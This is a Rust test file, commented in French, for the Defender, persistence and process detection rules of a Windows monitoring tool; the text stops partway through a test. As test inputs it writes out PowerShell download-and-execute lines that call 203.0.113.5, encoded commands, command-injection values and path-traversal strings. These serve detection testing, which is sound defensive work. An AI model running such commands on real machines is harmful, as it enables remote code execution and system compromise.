//! Tests des règles de détection, un positif et un négatif par règle (phase 3, PR 3.5 à 3.12 ; noms
//! `<id>_positif` et `<id>_negatif`, docs/detection/regles.md). Un positif prouve que la règle se déclenche sur
//! l'entrée qui la décrit ; un négatif, qu'une entrée voisine et légitime ne la déclenche pas.

// ------------------------------------------------------------ DEF : Microsoft Defender (PR 3.5)
// Journal Microsoft-Windows-Windows Defender/Operational (defender::traduire) et écarts entre deux relevés de l'état
// WMI (defender::ecarts). Aucune de ces règles n'est exercée en VM : Defender y reste intouché (lot 3d).

fn evenement_defender(id: u32, donnees: &[(&str, &str)]) -> String {
    let d: String = donnees.iter().map(|(n, v)| format!("<Data Name='{n}'>{v}</Data>")).collect();
    format!("<Event><System><EventID>{id}</EventID></System><EventData>{d}</EventData></Event>")
}

fn regle_defender(id: u32, donnees: &[(&str, &str)]) -> Option<(String, String)> {
    crate::defender::traduire(&evenement_defender(id, donnees)).map(|a| (a.regle, a.niveau))
}

fn regle_et_niveau(r: &str, n: &str) -> Option<(String, String)> {
    Some((r.to_string(), n.to_string()))
}

#[test]
fn def_001_positif() {
    assert_eq!(regle_defender(1116, &[("Threat Name", "Trojan:Win32/Test"), ("Path", "file:_C:\\x\\a.exe")]), regle_et_niveau("DEF-001", "Critique"));
}

#[test]
fn def_001_negatif() {
    // Une mise à jour des signatures (2000) n'est pas une détection
    assert_eq!(regle_defender(2000, &[("Threat Name", "Trojan:Win32/Test")]), None);
}

#[test]
fn def_002_positif() {
    assert_eq!(regle_defender(1117, &[("Threat Name", "Trojan:Win32/Test"), ("Action Name", "Quarantaine")]), regle_et_niveau("DEF-002", "Info"));
}

#[test]
fn def_002_negatif() {
    // 1118 (échec d'une action) n'est pas suivie : jamais « menace traitée »
    assert_eq!(regle_defender(1118, &[("Threat Name", "Trojan:Win32/Test")]), None);
}

#[test]
fn def_003_positif() {
    assert_eq!(regle_defender(5001, &[]), regle_et_niveau("DEF-003", "Critique"));
}

#[test]
fn def_003_negatif() {
    // 5000 : protection en temps réel ACTIVÉE
    assert_eq!(regle_defender(5000, &[]), None);
}

#[test]
fn def_004_positif() {
    assert_eq!(regle_defender(5010, &[]), regle_et_niveau("DEF-004", "Critique"));
    assert_eq!(regle_defender(5012, &[]), regle_et_niveau("DEF-004", "Critique"));
}

#[test]
fn def_004_negatif() {
    // 5009, 5011 : analyses réactivées
    assert_eq!(regle_defender(5009, &[]), None);
    assert_eq!(regle_defender(5011, &[]), None);
}

#[test]
fn def_005_positif() {
    let v = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\outil = 0x0";
    assert_eq!(regle_defender(5007, &[("New Value", v)]), regle_et_niveau("DEF-005", "Critique"));
}

#[test]
fn def_005_negatif() {
    // Exclusion RETIRÉE : nouvelle valeur vide, l'ancienne porte le chemin
    let ancienne = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\outil = 0x0";
    assert_eq!(regle_defender(5007, &[("Old Value", ancienne), ("New Value", "")]), None);
    // Autre réglage modifié (mise à jour des signatures)
    assert_eq!(regle_defender(5007, &[("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Signature Updates\SignatureUpdateInterval = 0x4")]), None);
}

#[test]
fn def_006_positif() {
    for v in [r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware = 0x1",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4"] {
        assert_eq!(regle_defender(5007, &[("New Value", v)]), regle_et_niveau("DEF-006", "Critique"), "{v}");
    }
}

#[test]
fn def_006_negatif() {
    // Protection RÉTABLIE (valeurs inverses)
    for v in [r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x0",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x5"] {
        assert_eq!(regle_defender(5007, &[("New Value", v)]), None, "{v}");
    }
}

#[test]
fn def_007_positif() {
    assert_eq!(regle_defender(1121, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"), ("Path", r"C:\x\a.exe")]), regle_et_niveau("DEF-007", "Alerte"));
    assert_eq!(regle_defender(1122, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"), ("Path", r"C:\x\a.exe")]), regle_et_niveau("DEF-007", "Info"));
}

#[test]
fn def_007_negatif() {
    // 1120 : hors de la plage suivie ; l'audit (1122) n'est jamais une alerte, seul le blocage (1121) l'est
    assert_eq!(regle_defender(1120, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]), None);
    assert_ne!(regle_defender(1122, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]).map(|(_, n)| n), Some("Alerte".into()));
}

#[test]
fn def_008_positif() {
    assert_eq!(regle_defender(1123, &[("Path", r"C:\Users\u\Documents\a.docx")]), regle_et_niveau("DEF-008", "Alerte"));
    assert_eq!(regle_defender(1124, &[("Path", r"C:\Users\u\Documents\a.docx")]), regle_et_niveau("DEF-008", "Info"));
}

#[test]
fn def_008_negatif() {
    // L'audit (1124) n'est jamais une alerte : seul le blocage (1123) l'est
    assert_ne!(regle_defender(1124, &[("Path", r"C:\Users\u\Documents\a.docx")]).map(|(_, n)| n), Some("Alerte".into()));
}

#[test]
fn def_009_positif() {
    assert_eq!(regle_defender(1125, &[("Path", "exemple.invalid")]), regle_et_niveau("DEF-009", "Alerte"));
    assert_eq!(regle_defender(1126, &[("Path", "exemple.invalid")]), regle_et_niveau("DEF-009", "Info"));
}

#[test]
fn def_009_negatif() {
    // 1127 : hors de la plage suivie
    assert_eq!(regle_defender(1127, &[("Path", "exemple.invalid")]), None);
}

fn etat_defender(temps_reel: bool, falsification: bool, antivirus: bool) -> crate::defender::EtatDefender {
    crate::defender::EtatDefender { disponible: true, temps_reel, protection_falsification: falsification, antivirus, ..Default::default() }
}

fn regles_ecarts(avant: &crate::defender::EtatDefender, apres: &crate::defender::EtatDefender) -> Vec<String> {
    crate::defender::ecarts(avant, apres).into_iter().map(|a| a.regle).collect()
}

#[test]
fn def_010_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(false, true, true)), ["DEF-010"]);
}

#[test]
fn def_010_negatif() {
    // Protection rétablie, ou déjà coupée au relevé précédent (une seule alerte, au moment de la coupure)
    assert!(regles_ecarts(&etat_defender(false, true, true), &etat_defender(true, true, true)).is_empty());
    assert!(regles_ecarts(&etat_defender(false, true, true), &etat_defender(false, true, true)).is_empty());
}

#[test]
fn def_011_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(true, false, true)), ["DEF-011"]);
}

#[test]
fn def_011_negatif() {
    assert!(regles_ecarts(&etat_defender(true, false, true), &etat_defender(true, true, true)).is_empty());
}

#[test]
fn def_012_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(true, true, false)), ["DEF-012"]);
}

#[test]
fn def_012_negatif() {
    // État illisible à l'un des deux relevés (WMI) : aucune conclusion, aucune alerte (la collecte EtatDefender le dit)
    let mut illisible = etat_defender(false, false, false);
    illisible.disponible = false;
    assert!(regles_ecarts(&etat_defender(true, true, true), &illisible).is_empty());
    assert!(regles_ecarts(&illisible, &etat_defender(true, true, true)).is_empty());
}

/// Dossier phase 3, § 7.1 : `defender::traduire` lit le journal de Defender (données écrites par Defender, mais aussi les
/// chemins et noms de menace qu'il recopie) : aucune panique sur un XML altéré
#[test]
fn def_traduire_sans_panique() {
    for id in [1116u32, 1117, 5007, 1121, 1123, 1125] {
        let valide = evenement_defender(id, &[("Threat Name", "Trojan:Win32/Test"), ("Path", "file:_C:\\x\\a.exe"), ("Process Name", "C:\\x\\p.exe"),
            ("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"), ("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]);
        crate::tests::torturer_texte(&valide, &mut |x| {
            let _ = crate::defender::traduire(x);
        });
    }
}

// ------------------------------------------------------------ PER : démarrages automatiques (PR 3.6)
// Relevé des démarrages automatiques comparé à la référence (persistance::comparer, décision pure) ; le relevé lui-même
// (registre, services, tâches) n'est pas exécuté ici. En VM : l'alerte de la clé Run de test (lot 3a).

fn entree_demarrage(cle: &str, commande: &str, signataire: &str, remarque: &str) -> crate::commun::EntreeDemarrage {
    crate::commun::EntreeDemarrage {
        cle: cle.into(), categorie: "Run (HKLM)".into(), nom: "Outil".into(), commande: commande.into(), cible: r"C:\Program Files\Outil\outil.exe".into(),
        signataire: signataire.into(), remarque: remarque.into(), ..Default::default()
    }
}

fn reference_demarrage(entrees: &[crate::commun::EntreeDemarrage]) -> std::collections::HashMap<String, crate::commun::EntreeDemarrage> {
    entrees.iter().map(|e| (e.cle.clone(), e.clone())).collect()
}

fn regles_comparer(reference: &[crate::commun::EntreeDemarrage], releve: &[crate::commun::EntreeDemarrage], apprentissage: bool) -> (Vec<(String, String)>, bool) {
    regles_comparer_avec(reference, releve, apprentissage, &mut Default::default())
}

fn regles_comparer_avec(reference: &[crate::commun::EntreeDemarrage], releve: &[crate::commun::EntreeDemarrage], apprentissage: bool,
                        en_attente: &mut std::collections::HashSet<String>) -> (Vec<(String, String)>, bool) {
    let mut r = releve.to_vec();
    let (a, modifie) = crate::persistance::comparer(&reference_demarrage(reference), &mut r, apprentissage, en_attente);
    (a.into_iter().map(|a| (a.regle, a.niveau)).collect(), modifie)
}

#[test]
fn per_001_positif() {
    let connue = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let nouvelle = entree_demarrage("k2", r#"powershell -w hidden -enc AAAA"#, "", "lancé via powershell");
    let (a, modifie) = regles_comparer(&[connue.clone()], &[connue, nouvelle], false);
    assert_eq!(a, [("PER-001".to_string(), "Alerte".to_string())], "entrée inconnue et suspecte : PER-001 au niveau Alerte");
    assert!(modifie);
    // Inconnue mais sans remarque : PER-001 au niveau Info
    let banale = entree_demarrage("k3", r#""C:\Program Files\Autre\autre.exe""#, "Éditeur", "");
    assert_eq!(regles_comparer(&[], &[banale], false).0, [("PER-001".to_string(), "Info".to_string())]);
}

#[test]
fn per_001_negatif() {
    let connue = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    // Relevé identique : rien
    assert_eq!(regles_comparer(&[connue.clone()], &[connue.clone()], false), (vec![], false));
    // Entrée nouvelle pendant l'apprentissage (premier relevé) : apprise, pas d'alerte
    let nouvelle = entree_demarrage("k2", "x.exe", "", "NON SIGNÉ");
    let (a, modifie) = regles_comparer(&[connue.clone()], &[connue, nouvelle], true);
    assert!(a.is_empty() && modifie, "apprentissage : référence réécrite, aucune alerte");
}

#[test]
fn per_002_positif() {
    let avant = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let apres = entree_demarrage("k1", r#""C:\Users\Public\outil.exe""#, "", "dossier suspect");
    let (a, modifie) = regles_comparer(&[avant], &[apres], false);
    assert_eq!(a, [("PER-002".to_string(), "Alerte".to_string())]);
    assert!(modifie);
    // Audit de #83, S83-06 : même commande, entrée devenue suspecte (classe COM surchargée après coup dans un profil)
    // Confirmée au relevé suivant (relecture de #83, R3-D1) : rien au premier, l'alerte au second
    let tache = entree_demarrage("t1", "COM {F47D8C53-0B74-4A66-959D-367710AB1F84}", "Microsoft Windows", "");
    let surchargee = entree_demarrage("t1", "COM {F47D8C53-0B74-4A66-959D-367710AB1F84}", "?", "serveur COM non enregistré pour la machine");
    let mut attente = std::collections::HashSet::new();
    assert!(regles_comparer_avec(&[tache], &[surchargee.clone()], false, &mut attente).0.is_empty(), "premier relevé : à confirmer");
    assert_eq!(regles_comparer_avec(&[surchargee.clone()], &[surchargee.clone()], false, &mut attente).0, [("PER-002".to_string(), "Alerte".to_string())]);
    assert!(attente.is_empty());
    assert!(regles_comparer_avec(&[surchargee.clone()], &[surchargee], false, &mut attente).0.is_empty(), "une seule alerte");
}

#[test]
fn per_002_devenu_suspect_passager() {
    // Relecture de #83, R3-D1 : signature passagèrement invérifiable (démarrage du PC) : « NON SIGNÉ » un relevé, propre
    // au suivant ; aucune alerte
    let propre = entree_demarrage("s1", r#"C:\WINDOWS\System32\svchost.exe -k x"#, "Microsoft Windows", "");
    let passagere = entree_demarrage("s1", r#"C:\WINDOWS\System32\svchost.exe -k x"#, "", "NON SIGNÉ");
    let mut attente = std::collections::HashSet::new();
    assert!(regles_comparer_avec(&[propre.clone()], &[passagere.clone()], false, &mut attente).0.is_empty());
    assert!(regles_comparer_avec(&[passagere], &[propre], false, &mut attente).0.is_empty());
    assert!(attente.is_empty(), "plus rien à confirmer");
    // Entrée disparue, ou commande changée, entre les deux relevés : oubliée
    let mut attente: std::collections::HashSet<String> = ["s2".to_string()].into();
    let autre = entree_demarrage("s3", "z.exe", "Éditeur", "");
    regles_comparer_avec(&[autre.clone()], &[autre], false, &mut attente);
    assert!(attente.is_empty());
}

/// Relecture de #83, R4-D1 : un échec de vérification de signature n'est pas gardé comme un résultat : il ne vaut que
/// 30 s, et le relevé suivant (une minute plus tard) le refait ; un résultat signé, lui, est gardé. R5-D1 : une seule
/// clé d'échec par chemin, quel que soit le nombre d'échecs
#[test]
fn per_002_echec_de_signature_non_garde() {
    use crate::moniteur::{echec_recent, signataire_cache_a};
    assert!(echec_recent("7|100", 7, 129, 30));
    assert!(!echec_recent("7|100", 7, 130, 30), "30 s passées");
    assert!(!echec_recent("7|100", 8, 101, 30), "fichier modifié depuis");
    assert!(!echec_recent("7|100", 7, 99, 30), "horloge reculée (R6-D1)");
    assert!(echec_recent("7|100", 7, 90_000, u64::MAX), "cycle de surveillance : gardé tant que le fichier ne change pas");
    assert!(!echec_recent("7|100", 8, 101, u64::MAX));
    assert!(!echec_recent("", 0, 0, 30) && !echec_recent("x|y", 0, 0, 30));
    // Fichier non signé hors de Windows : vérification exécutée, résultat vide rangé sous la clé d'échec seulement
    let d = std::env::temp_dir().join(format!("d4t-sig-{}", std::process::id()));
    std::fs::create_dir_all(&d).unwrap();
    let f = d.join("outil.exe");
    std::fs::write(&f, b"MZ pas un vrai programme").unwrap();
    let chemin = f.to_string_lossy().to_string();
    let mut cache = std::collections::HashMap::new();
    let s = signataire_cache_a(&mut cache, "", &chemin, 1_000, 30);
    let premier = cache.clone();
    // Dans les 30 s : échec repris du cache, sans nouvelle vérification (heure notée inchangée)
    signataire_cache_a(&mut cache, "", &chemin, 1_010, 30);
    assert_eq!(cache, premier);
    // Cycle de surveillance (durée illimitée) : repris bien plus tard, sans nouvelle vérification
    signataire_cache_a(&mut cache, "", &chemin, 80_000, u64::MAX);
    assert_eq!(cache, premier);
    // Échecs dans des tranches éloignées : toujours une seule clé, réécrite
    signataire_cache_a(&mut cache, "", &chemin, 5_000, 30);
    let s3 = signataire_cache_a(&mut cache, "", &chemin, 90_000, 30);
    let _ = std::fs::remove_dir_all(&d);
    assert!(s.is_empty() && s3.is_empty(), "fichier non signé : {s} {s3}");
    assert_eq!(cache.len(), 1, "{:?}", cache);
    let (cle, valeur) = cache.iter().next().unwrap();
    assert_eq!(cle, &format!("{chemin}|échec"), "échec gardé comme un résultat");
    assert!(valeur.ends_with("|90000"), "{valeur}");
}

#[test]
fn per_002_devenu_suspect_negatif() {
    let suspecte = entree_demarrage("t1", "x.exe", "", "NON SIGNÉ");
    // Déjà suspecte au relevé précédent (remarque changée, pas apparue) : une seule alerte, au moment où elle l'est devenue
    assert!(regles_comparer(&[suspecte.clone()], &[entree_demarrage("t1", "x.exe", "", "NON SIGNÉ, dossier suspect")], false).0.is_empty());
    // Redevenue propre : pas d'alerte
    assert!(regles_comparer(&[suspecte], &[entree_demarrage("t1", "x.exe", "Éditeur", "")], false).0.is_empty());
    // Devenue suspecte pendant l'apprentissage : pas d'alerte
    let propre = entree_demarrage("t2", "y.exe", "Éditeur", "");
    assert!(regles_comparer(&[propre], &[entree_demarrage("t2", "y.exe", "", "NON SIGNÉ")], true).0.is_empty());
}

#[test]
fn per_002_negatif() {
    // Même commande, signataire ou remarque changés (mise à jour signée par un autre certificat) : noté, sans alerte
    let avant = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let apres = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur 2", "");
    let (a, modifie) = regles_comparer(&[avant.clone()], &[apres], false);
    assert!(a.is_empty() && modifie, "signataire changé : référence réécrite, aucune alerte");
    // Commande changée pendant l'apprentissage : pas d'alerte
    let modifiee = entree_demarrage("k1", "autre.exe", "Éditeur", "");
    assert!(regles_comparer(&[avant], &[modifiee], true).0.is_empty());
}

/// Bruit mesuré (PR 3.6) : tâches « SoftLanding » de Windows dont la classe COM est empaquetée (AppX). Leur serveur est
/// un fichier du dossier du paquet ; le chemin lu dans le registre ne doit jamais en sortir
#[test]
fn per_001_com_empaquete_chemin_borne() {
    use crate::persistance::{chemin_dans_paquet, version_paquet};
    let racine = r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy";
    assert_eq!(chemin_dans_paquet(racine, r"SoftLandingTask\SoftLandingTask.exe").as_deref(), Some(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SoftLandingTask\SoftLandingTask.exe"));
    assert_eq!(chemin_dans_paquet(&format!(r"{racine}\"), "a/b.dll").as_deref(), Some(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\a\b.dll"));
    for mauvais in [r"..\..\Users\Public\x.exe", r"a\..\..\x.exe", r"C:\Users\Public\x.exe", r"\\serveur\partage\x.exe", "a.exe:flux", "", "  ",
                    r"...\x.exe", r". .\x.exe", r"a\ .. \x.exe"] {
        assert_eq!(chemin_dans_paquet(racine, mauvais), None, "{mauvais}");
    }
    assert_eq!(chemin_dans_paquet("", "a.exe"), None);
    // Paquets de Windows seulement (audit de #83, S83-03) ; racine sous SystemApps ou WindowsApps, sans remontée
    use crate::persistance::{paquet_de_windows, racine_systeme_de_paquets};
    assert!(paquet_de_windows("MicrosoftWindows.Client.CBS_1000.26100.372.0_x64__cw5n1h2txyewy"));
    assert!(paquet_de_windows("Microsoft.WindowsStore_22410.1401.3.0_x64__8wekyb3d8bbwe"));
    assert!(!paquet_de_windows("Editeur.Outil_1.0.0.0_x64__abcdefghijklm"));
    assert!(!paquet_de_windows("Editeur.Outil_1.0.0.0_x64__cw5n1h2txyewyx"));
    let (w, pf) = (r"C:\WINDOWS", r"C:\Program Files");
    assert!(racine_systeme_de_paquets(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy", w, pf));
    assert!(racine_systeme_de_paquets(r"C:\Program Files\WindowsApps\Microsoft.X_1.0_x64__8wekyb3d8bbwe", w, pf));
    for mauvaise in [r"C:\Users\u\AppData\Local\Packages\X", r"C:\WINDOWS\SystemApps", r"C:\WINDOWS\SystemApps\..\Temp", r"D:\dev\paquet", r"C:\WINDOWS\SystemAppsX\Y", ""] {
        assert!(!racine_systeme_de_paquets(mauvaise, w, pf), "{mauvaise}");
    }
    assert!(!racine_systeme_de_paquets(r"C:\WINDOWS\SystemApps\X", "", ""), "dossiers système inconnus : refus");
    // Classe surchargée dans un profil (HKCU) : jamais résolue (contrôle du source : le registre n'est pas lu ici)
    let p = include_str!("persistance.rs").replace("\r\n", "\n");
    let d = p.find("fn serveur_com_empaquete(").unwrap();
    let f = &p[d..d + p[d..].find("\n}\n").unwrap()];
    assert!(f.find("if surchargee {\n        return None;").unwrap() < f.find(r"PackagedCom\ClassIndex").unwrap(), "classe surchargée dans un profil résolue quand même");
    assert!(f.contains(".filter(|p| paquet_de_windows(p))") && f.contains("if !racine_systeme_de_paquets("), "paquet ou racine non vérifiés");
    // La version la plus récente, comparée nombre par nombre
    assert!(version_paquet("P_1000.26100.372.0_x64__e") > version_paquet("P_1000.26100.360.0_x64__e"));
    assert!(version_paquet("P_1.100.0.0_x64__e") > version_paquet("P_1.99.0.0_x64__e"));
}

/// Bruit mesuré (PR 3.6) : le nettoyage que OneDrive pose dans « RunOnce » (effacer son installeur) n'est plus pris pour
/// un interpréteur suspect ; la moindre variation de la commande l'y remet
#[test]
fn per_001_nettoyage_onedrive() {
    use crate::persistance::nettoyage_onedrive;
    assert!(nettoyage_onedrive(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#));
    assert!(nettoyage_onedrive(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\Jean Dupont\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""#));
    for c in [
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" & calc.exe"#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\Autre.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u&calc\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /c powershell -enc AAAA"#,
        r#"C:\Users\u\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        // Audit de #83, S83-01 : variable remplacée par cmd avant l'analyse (injection), et autres caractères spéciaux
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\%Z%\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u^&calc\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\!Z!\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u)(x\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
    ] {
        assert!(!nettoyage_onedrive(c), "{c}");
    }
    // Branché dans l'évaluation : la commande exacte n'est plus « lancé via cmd », une variante l'est toujours
    let e = |commande: &str| crate::commun::EntreeDemarrage {
        categorie: "RunOnce (u)".into(), nom: "Delete Cached Update Binary".into(), commande: commande.into(),
        cible: r"C:\WINDOWS\system32\cmd.exe".into(), signataire: "Microsoft Windows".into(), ..Default::default()
    };
    assert!(!crate::persistance::evaluer(&e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#)).contains("lancé via cmd"));
    assert!(crate::persistance::evaluer(&e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" & calc"#)).contains("lancé via cmd"));
    // Exemption réservée à « RunOnce » : la même commande dans « Run » ou une tâche reste suspecte (S83-01)
    let mut run = e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#);
    run.categorie = "Run (u)".into();
    assert!(crate::persistance::evaluer(&run).contains("lancé via cmd"));
}

// ------------------------------------------------------------ PRC : processus (PR 3.7)
// Décision pure de processus::alerte_processus, sur des processus synthétiques (création de processus de Sysmon 1 ou de
// WMI, avec le parent et la ligne de commande). Aucune de ces règles n'est exercée en VM : voir la fiche.

fn regle_processus(image: &str, ligne: Option<&str>, parent: Option<&str>) -> Option<(String, String)> {
    let p = crate::processus::InfoProcessus::pour_test(image, ligne, parent);
    crate::processus::alerte_processus(1234, &p).map(|a| (a.regle, a.niveau))
}

const WORD: &str = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
const EXPLORATEUR: &str = r"C:\Windows\explorer.exe";

#[test]
fn prc_001_positif() {
    // Word qui lance PowerShell, même sans ligne de commande suspecte (ou sans ligne : processus déjà terminé)
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
    assert_eq!(regle_processus(POWERSHELL, None, Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
    // Avec un motif de téléchargement en plus : la plus forte reste PRC-001
    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(WORD)),
               regle_et_niveau("PRC-001", "Critique"));
}

#[test]
fn prc_001_negatif() {
    // PowerShell lancé par l'Explorateur ; Word qui lance un programme qui n'est pas un interpréteur
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\splwow64.exe", Some("splwow64.exe 8192"), Some(WORD)), None);
}

/// Audit du 2026-11-23, A-7-8 : autres programmes qu'une macro lance pour exécuter du code (aide compilée, paquet MSI,
/// forfiles, cmstp, odbcconf, regasm, regsvcs, msxsl), et le nouvel Outlook (olk.exe) comme document ; conhost n'est
/// pas un interpréteur retenu (Windows le crée pour toute console : faux positif Critique)
#[test]
fn prc_001_interpreteurs_elargis() {
    for exe in ["hh", "msiexec", "forfiles", "cmstp", "odbcconf", "regasm", "regsvcs", "msxsl"] {
        let chemin = format!(r"C:\Windows\System32\{exe}.exe");
        assert_eq!(regle_processus(&chemin, Some(&format!("{exe}.exe x")), Some(WORD)), regle_et_niveau("PRC-001", "Critique"), "{exe}");
    }
    let olk = r"C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2024.0.0_x64__8wekyb3d8bbwe\olk.exe";
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(olk)), regle_et_niveau("PRC-001", "Critique"));
    assert_eq!(regle_processus(r"C:\Windows\System32\conhost.exe", Some("conhost.exe 0xffffffff -ForceV1"), Some(WORD)), None);
}

#[test]
fn prc_002_positif() {
    let encode = format!("powershell.exe -NoP -W Hidden -enc {}", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
    assert_eq!(regle_processus(POWERSHELL, Some(&encode), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"));
    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-002", "Alerte"));
}

/// Audit du 2026-11-23, A-7-1 : formes de PRC-002 manquées avant (abréviations de -EncodedCommand, iex après le
/// téléchargement, téléchargement sans iex vers une adresse http(s)), avec le code de comportement attendu
#[test]
fn prc_002_formes_elargies() {
    let b64 = "SQBFAFgA".repeat(8);
    let cas: Vec<(String, &str)> = vec![
        ("powershell -c \"irm https://203.0.113.5/a.ps1 | iex\"".into(), "telecharge"),
        (format!("powershell -NoP -ec {b64}"), "obscurci"),
        (format!("powershell -NoP -enco {b64}"), "obscurci"),
        (format!("powershell /e {b64}"), "obscurci"),
        (format!("powershell -e \"{b64}\""), "obscurci"),
        (format!("pwsh -NoProfile -EncodedCommand {b64}"), "obscurci"),
        ("powershell -c \"iwr https://203.0.113.5/a.exe -OutFile a.exe; start a.exe\"".into(), "telecharge"),
        ("powershell -c \"Start-BitsTransfer https://203.0.113.5/a a.exe\"".into(), "telecharge"),
        ("powershell -c \"Invoke-RestMethod -Uri http://203.0.113.5/a | Invoke-Expression\"".into(), "telecharge"),
        ("powershell -c \"$s = iwr http://203.0.113.5/a; iex $s.Content\"".into(), "telecharge"),
        // Décision (A-7-1) : un téléchargement en ligne de commande vers une adresse http(s) alerte, même vers un
        // intranet et sans iex : rare sur un poste personnel, technique centrale des attaquants, niveau Alerte
        // seulement (jamais Critique) et silencieux par une exception sur son code de comportement
        ("powershell -c \"Invoke-WebRequest https://intranet.local/rapport.csv -OutFile r.csv\"".into(), "telecharge"),
    ];
    for (ligne, code) in &cas {
        assert_eq!(regle_processus(POWERSHELL, Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"), "{ligne}");
        assert_eq!(crate::processus::codes_prc002(ligne), [*code], "{ligne}");
    }
    // Les formes déjà vues restent vues
    for ligne in [format!("powershell -NoP -enc {b64}"), "powershell -w h -c \"iex(irm https://203.0.113.5)\"".into()] {
        assert_eq!(regle_processus(POWERSHELL, Some(&ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"), "{ligne}");
    }
}

/// Audit du 2026-11-23, A-7-1 : copie renommée de PowerShell, reconnue par le nom d'origine du fichier (champ
/// OriginalFileName de Sysmon 1) ; sans ce champ (4688, WMI), le nom seul ne suffit pas : limite écrite dans la fiche
#[test]
fn prc_002_copie_renommee_par_nom_origine() {
    let ligne = format!(r"C:\Users\Public\p.exe -NoP -enc {}", "SQBFAFgA".repeat(8));
    let copie = r"C:\Users\Public\p.exe";
    let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR));
    assert!(crate::processus::alerte_processus(1, &p).is_none(), "sans nom d'origine : limite déclarée");
    for origine in ["PowerShell.EXE", "pwsh.dll"] {
        let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR)).avec_nom_origine(origine);
